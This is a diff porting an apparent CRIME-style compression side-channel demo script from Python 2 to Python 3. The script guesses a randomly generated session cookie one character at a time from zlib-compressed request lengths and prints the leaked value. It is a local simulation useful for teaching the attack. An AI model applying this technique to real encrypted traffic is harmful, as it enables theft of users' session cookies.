@@ -10,10 +10,12 @@ import sys
 import random
 import time # to print more slowly
 
-charset = string.letters + string.digits + "%/+="
+charset = string.ascii_letters + string.digits + "%/+="
 
 COOKIE = ''.join(random.choice(charset) for x in range(30))
-print "Randomly generated cookie: " + str(COOKIE)
+print("Randomly generated cookie: " + str(COOKIE))
+
+time.sleep(1)
 
 HEADERS = ("POST / HTTP/1.1\r\n"
        "Host: thebankserver.com\r\n"
@@ -47,7 +49,9 @@ cookie = ""
 def compress(data):
 
     c = zlib.compressobj()
-    return c.compress(data) + c.flush(zlib.Z_SYNC_FLUSH)
+    foo = c.compress(bytes(data, 'utf-8'))
+    foo += c.flush(zlib.Z_SYNC_FLUSH)
+    return foo
 
 def findnext(b,bs,charset, show_guess):
     # is bs always ""?
@@ -69,7 +73,7 @@ def findnext(b,bs,charset, show_guess):
 
         #print repr(c), length, baselen
         if show_guess:
-            print "cookie ?= %s" % guess_cookie
+            print("cookie ?= %s" % guess_cookie)
             time.sleep(.01)
         # print "guess next char %s\tpacket length %s" % (c, length)
 
@@ -83,8 +87,8 @@ def findnext(b,bs,charset, show_guess):
     return possible_chars
 
 def exit():
-    print "Original cookie: %s" % COOKIE
-    print "Leaked cookie  : %s" % cookie
+    print("Original cookie: %s" % COOKIE)
+    print("Leaked cookie  : %s" % cookie)
     sys.exit(1)
 
     
@@ -105,7 +109,7 @@ def forward():
                 return False
 
             if len(orig) > 0:
-                print orig
+                print(orig)
                 time.sleep(.3)
 
             # shift the compression window over by one
@@ -115,15 +119,15 @@ def forward():
 
         cookie = cookie + possible_chars[0]
 
-        def prGreen(skk): print "\033[92m {}\033[00m".format(skk)
+        def prGreen(skk): print("\033[92m {}\033[00m".format(skk))
 
         prGreen("\ncookie  : %s\n" % cookie)
-        time.sleep(.3)
+        time.sleep(1)
     return True
 
 while BODY.find("\r\n") >= 0:
 
-    def prRed(skk): print "\033[91m {}\033[00m".format(skk)
+    def prRed(skk): print("\033[91m {}\033[00m".format(skk))
     
     if not forward():
         # messed up some character and got stuck
